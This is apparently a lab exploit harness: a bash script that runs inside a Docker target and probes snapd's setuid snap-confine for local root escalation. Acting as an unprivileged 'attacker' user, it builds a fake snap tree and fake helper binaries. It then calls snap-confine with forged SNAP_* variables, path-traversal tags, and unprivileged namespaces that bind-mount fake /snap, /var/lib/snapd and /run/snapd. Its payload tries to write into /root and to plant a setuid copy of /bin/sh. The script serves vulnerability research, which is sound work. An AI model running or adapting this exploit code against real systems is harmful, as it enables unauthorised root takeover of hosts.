#!/usr/bin/env bash
set -u

TARGET="${TARGET:-ubuntu24-server-lpe-target}"

docker exec -i "$TARGET" bash -s <<'INNER'
set -u
export LC_ALL=C

BASE=/tmp/scfbd-work
ROOT_MARK=/root/scfbd-root-proof
TMP_MARK=/tmp/scfbd-host-root-proof

section() {
  printf '\n===== %s =====\n' "$1"
}

run() {
  local label="$1"
  shift
  section "$label"
  printf '+ %s\n' "$*"
  timeout 20s bash -lc "$*"
  local rc=$?
  printf '[rc=%s] %s\n' "$rc" "$label"
}

as_attacker() {
  timeout -k 3s 20s runuser -u attacker -- env BASE="$BASE" ROOT_MARK="$ROOT_MARK" TMP_MARK="$TMP_MARK" bash -lc "$*"
}

cleanup() {
  rm -f /run/snapd/lock/scfbd.lock /run/snapd/lock/scfbd_*.lock 2>/dev/null || true
  rm -f "$ROOT_MARK" "$TMP_MARK" "$TMP_MARK.suid" 2>/dev/null || true
  runuser -u attacker -- rm -rf "$BASE" /tmp/scfbd-userns-owner-proof 2>/dev/null || true
}

payload_report() {
  local label="$1"
  section "payload artifacts after $label"
  for f in "$BASE"/payload.out "$BASE"/sh_p_id.out "$BASE"/root_write.out "$ROOT_MARK" "$TMP_MARK" "$TMP_MARK.suid"; do
    if [ -e "$f" ]; then
      ls -ln "$f" 2>&1 || true
      sed -n '1,80p' "$f" 2>&1 || true
    else
      printf 'MISSING %s\n' "$f"
    fi
  done
}

clear_payload() {
  rm -f "$ROOT_MARK" "$TMP_MARK" "$TMP_MARK.suid" 2>/dev/null || true
  runuser -u attacker -- rm -f "$BASE"/payload.out "$BASE"/sh_p_id.out "$BASE"/root_write.out 2>/dev/null || true
}

sc_env='PATH=/usr/bin:/bin SNAPD_DEBUG=1 SNAP_NAME=scfbd SNAP_INSTANCE_NAME=scfbd SNAP_REVISION=1 SNAP_COOKIE=scfbd-cookie SNAP_CONTEXT=scfbd-context SNAP_DATA=/tmp/scfbd-work/data SNAP_COMMON=/tmp/scfbd-work/common SNAP_USER_DATA=/tmp/scfbd-work/user-data SNAP_USER_COMMON=/tmp/scfbd-work/user-common'

trap cleanup EXIT

section "pre-clean"
cleanup

section "target identity package version and default snap state"
id
getent passwd attacker || true
runuser -u attacker -- id
sed -n '1,8p' /etc/os-release
dpkg-query -W snapd systemd 2>&1 || true
snap version 2>&1 || true
snap list --all 2>&1 || true
stat -c '%n %U:%G %a %A %u:%g %s' /usr/lib/snapd/snap-confine /usr/lib/snapd/snap-update-ns /snap /var/lib/snapd /var/lib/snapd/snaps /run/snapd /run/snapd/ns 2>&1 || true
getcap -v /usr/lib/snapd/snap-confine /usr/lib/snapd/snap-update-ns 2>&1 || true
find /snap /var/lib/snapd /run/snapd -maxdepth 2 -xdev -printf '%M %u:%g %p\n' 2>&1 | sort || true

section "root-owned state is not attacker writable"
as_attacker '
for d in /snap /snap/bin /var/lib/snapd /var/lib/snapd/snaps /var/lib/snapd/mount /run/snapd /run/snapd/ns /run/snapd/lock /tmp /var/tmp; do
  printf "test -w %-30s -> " "$d"
  test -w "$d"; echo "$?"
  touch "$d/scfbd_uid1001_write_probe" 2>&1
  printf "touch %-32s rc=%s\n" "$d" "$?"
  rm -f "$d/scfbd_uid1001_write_probe" 2>/dev/null || true
done
'

section "prior gating as uid1001"
as_attacker 'snap list --all 2>&1 || true'
as_attacker 'snap install hello-world 2>&1; printf "snap_install_rc=%s\n" "$?"'
as_attacker 'curl -sS -i --unix-socket /run/snapd.socket -H "Content-Type: application/json" -X POST --data "{\"action\":\"install\",\"snaps\":[\"hello-world\"]}" http://localhost/v2/snaps 2>&1 | sed -n "1,20p"'
as_attacker 'curl -sS -i --unix-socket /run/snapd-snap.socket http://localhost/v2/system-info 2>&1 | sed -n "1,20p"'

section "create attacker fake snap base app and namespace inputs"
as_attacker '
set -e
mkdir -p "$BASE"/{data,common,user-data,user-common,pathbin,fake-snap,private-target}
mkdir -p "$BASE"/fake-snap/{core/1/meta,snapd/1/meta,scfbd/1/meta,scfbd/1/bin}
ln -sfn 1 "$BASE"/fake-snap/core/current
ln -sfn 1 "$BASE"/fake-snap/snapd/current
ln -sfn 1 "$BASE"/fake-snap/scfbd/current
cat > "$BASE"/fake-snap/core/1/meta/snap.yaml <<EOF
name: core
type: base
version: "16"
EOF
cat > "$BASE"/fake-snap/snapd/1/meta/snap.yaml <<EOF
name: snapd
type: snapd
version: "2.74.1"
EOF
cat > "$BASE"/fake-snap/scfbd/1/meta/snap.yaml <<EOF
name: scfbd
version: "1"
base: core
confinement: strict
apps:
  app:
    command: bin/payload.sh
EOF
cat > "$BASE"/payload.sh <<EOF
#!/usr/bin/env bash
set +e
{
  echo PAYLOAD_RAN
  id
  echo "uid_map=\$(cat /proc/self/uid_map 2>/dev/null | tr "\n" ";")"
  grep -E "Cap(Inh|Prm|Eff|Bnd|Amb)" /proc/self/status
  capsh --print 2>/dev/null | sed -n "1,12p"
  echo "mount_ns=\$(readlink /proc/self/ns/mnt)"
  echo "pid_ns=\$(readlink /proc/self/ns/pid)"
} > "$BASE"/payload.out 2>&1
/bin/sh -p -c "id; grep -E \"Cap(Inh|Prm|Eff|Bnd|Amb)\" /proc/self/status" > "$BASE"/sh_p_id.out 2>&1
touch "$ROOT_MARK" > "$BASE"/root_write.out 2>&1
echo "root_touch_rc=\$?" >> "$BASE"/root_write.out
echo "root write attempt from \$(id)" > "$TMP_MARK" 2>> "$BASE"/root_write.out
cp /bin/sh "$TMP_MARK.suid" 2>> "$BASE"/root_write.out && chmod 4755 "$TMP_MARK.suid" 2>> "$BASE"/root_write.out
exit 0
EOF
chmod 0755 "$BASE"/payload.sh
cp "$BASE"/payload.sh "$BASE"/fake-snap/scfbd/1/bin/payload.sh
cat > "$BASE"/pathbin/snap-update-ns <<EOF
#!/usr/bin/env bash
echo FAKE_UPDATE_NS_RAN "\$@" >> "$BASE"/fake-update-ns.out
exit 0
EOF
cat > "$BASE"/pathbin/snap-discard-ns <<EOF
#!/usr/bin/env bash
echo FAKE_DISCARD_NS_RAN "\$@" >> "$BASE"/fake-discard-ns.out
exit 0
EOF
chmod 0755 "$BASE"/pathbin/snap-update-ns "$BASE"/pathbin/snap-discard-ns
mkdir -p "$BASE"/fake-var-lib-snapd/{mount,snaps,sequence,cookie}
cat > "$BASE"/fake-var-lib-snapd/mount/snap.scfbd.fstab <<EOF
# fake per-snap mount profile supplied by uid1001 namespace root
$BASE/fake-snap/scfbd/1 /snap/scfbd/1 none bind,ro 0 0
EOF
mkdir -p "$BASE"/fake-run-snapd/{lock,ns}
find "$BASE" -maxdepth 5 -printf "%M %u:%g %p -> %l\n" | sort
'

run_case() {
  local label="$1"
  local body="$2"
  clear_payload
  section "$label"
  as_attacker "$body"
  local rc=$?
  printf '[rc=%s] %s\n' "$rc" "$label"
  payload_report "$label"
}

run_case "direct no environment" \
'/usr/lib/snapd/snap-confine snap.scfbd.app "$BASE"/payload.sh 2>&1'

run_case "direct full fake snap environment" \
'env -i '"$sc_env"' /usr/lib/snapd/snap-confine snap.scfbd.app "$BASE"/payload.sh 2>&1'

run_case "direct full env with fake SNAP_MOUNT_DIR and fake helper PATH" \
'env -i PATH="$BASE"/pathbin:/usr/bin:/bin SNAPD_DEBUG=1 SNAP_MOUNT_DIR="$BASE"/fake-snap SNAP_NAME=scfbd SNAP_INSTANCE_NAME=scfbd SNAP_REVISION=1 SNAP_COOKIE=scfbd-cookie SNAP_CONTEXT=scfbd-context SNAP_DATA="$BASE"/data SNAP_COMMON="$BASE"/common SNAP_USER_DATA="$BASE"/user-data SNAP_USER_COMMON="$BASE"/user-common /usr/lib/snapd/snap-confine snap.scfbd.app "$BASE"/payload.sh 2>&1; printf "fake-update-ns="; cat "$BASE"/fake-update-ns.out 2>/dev/null || echo MISSING'

run_case "direct env attempts to change base and component semantics" \
'env -i '"$sc_env"' SNAP_BASE=none SNAP_COMPONENT_NAME=scfbd+comp SNAP_COMPONENT_REVISION=1 /usr/lib/snapd/snap-confine snap.scfbd+comp.hook.configure "$BASE"/payload.sh 2>&1'

run_case "direct traversal and malformed semantic tags" \
'for tag in "snap.scfbd/../../tmp.x" "snap..app" "snap.scfbd..app" "snap.scfbd_../../x.app" "snap.scfbd.hook.configure"; do echo "--- tag=$tag"; env -i '"$sc_env"' /usr/lib/snapd/snap-confine "$tag" "$BASE"/payload.sh 2>&1; echo "tag_rc=$?"; done'

run_case "direct snap-update-ns helper as uid1001" \
'/usr/lib/snapd/snap-update-ns scfbd 2>&1'

run_case "user namespace root without fake bind mounts" \
'unshare -Ur bash -lc "id; echo uid_map=\$(cat /proc/self/uid_map | tr \"\\n\" \";\"); env -i '"$sc_env"' /usr/lib/snapd/snap-confine snap.scfbd.app '$BASE'/payload.sh 2>&1; echo ns_rc=\$?; echo owner-proof > /tmp/scfbd-userns-owner-proof; ls -ln /tmp/scfbd-userns-owner-proof" 2>&1; echo outside_owner; ls -ln /tmp/scfbd-userns-owner-proof 2>&1 || true'

run_case "user and mount namespace with fake /snap bind only" \
'unshare -Urm bash -lc "id; echo uid_map=\$(cat /proc/self/uid_map | tr \"\\n\" \";\"); mount --make-rprivate / 2>/dev/null || true; mount --bind '$BASE'/fake-snap /snap; echo bind_snap_rc=\$?; findmnt /snap || true; env -i '"$sc_env"' /usr/lib/snapd/snap-confine snap.scfbd.app '$BASE'/payload.sh 2>&1; echo ns_rc=\$?" 2>&1'

run_case "user mount pid namespace with fake /snap so /proc/1/root/snap is fake" \
'unshare -Urmpf --mount-proc bash -lc "id; echo self=\$\$; echo uid_map=\$(cat /proc/self/uid_map | tr \"\\n\" \";\"); mount --make-rprivate / 2>/dev/null || true; mount --bind '$BASE'/fake-snap /snap; echo bind_snap_rc=\$?; readlink /proc/1/root/snap; ls -la /proc/1/root/snap; findmnt /snap || true; env -i '"$sc_env"' /usr/lib/snapd/snap-confine snap.scfbd.app '$BASE'/payload.sh 2>&1; echo ns_rc=\$?" 2>&1'

run_case "user mount pid namespace with fake /snap /var/lib/snapd and /run/snapd" \
'unshare -Urmpf --mount-proc bash -lc "id; echo uid_map=\$(cat /proc/self/uid_map | tr \"\\n\" \";\"); mount --make-rprivate / 2>/dev/null || true; mount --bind '$BASE'/fake-snap /snap; echo bind_snap_rc=\$?; mount --bind '$BASE'/fake-var-lib-snapd /var/lib/snapd; echo bind_varlib_rc=\$?; mount --bind '$BASE'/fake-run-snapd /run/snapd; echo bind_run_rc=\$?; findmnt /snap /var/lib/snapd /run/snapd || true; env -i '"$sc_env"' /usr/lib/snapd/snap-confine snap.scfbd.app '$BASE'/payload.sh 2>&1; echo ns_rc=\$?" 2>&1'

run_case "user mount pid namespace direct app path under fake snap" \
'unshare -Urmpf --mount-proc bash -lc "id; mount --make-rprivate / 2>/dev/null || true; mount --bind '$BASE'/fake-snap /snap; echo bind_snap_rc=\$?; env -i '"$sc_env"' /usr/lib/snapd/snap-confine snap.scfbd.app /snap/scfbd/current/bin/payload.sh 2>&1; echo ns_rc=\$?" 2>&1'

section "post-probe host root proof check"
if [ -e "$ROOT_MARK" ] || [ -e "$TMP_MARK.suid" ]; then
  echo "ROOT_PROOF_CANDIDATE=YES"
else
  echo "ROOT_PROOF_CANDIDATE=NO"
fi
ls -ln "$ROOT_MARK" "$TMP_MARK" "$TMP_MARK.suid" "$BASE"/payload.out "$BASE"/sh_p_id.out "$BASE"/root_write.out 2>&1 || true
if [ -x "$TMP_MARK.suid" ]; then
  runuser -u attacker -- "$TMP_MARK.suid" -p -c 'id; grep -E "Cap(Inh|Prm|Eff|Bnd|Amb)" /proc/self/status' 2>&1 || true
fi

section "snapd state side effects before cleanup"
find /run/snapd/lock -maxdepth 1 -name 'scfbd*' -printf '%M %u:%g %p %s\n' 2>&1 || true
find "$BASE" -maxdepth 4 -printf '%M %u:%g %p -> %l\n' 2>&1 | sort || true

section "cleanup"
cleanup
find /run/snapd/lock -maxdepth 1 -name 'scfbd*' -printf '%M %u:%g %p %s\n' 2>&1 || true
ls -ld "$BASE" "$ROOT_MARK" "$TMP_MARK" "$TMP_MARK.suid" /tmp/scfbd-userns-owner-proof 2>&1 || true

section "final snap health"
systemctl is-active snapd.socket snapd.service snapd.seeded.service 2>&1 || true
snap list --all 2>&1 || true
INNER
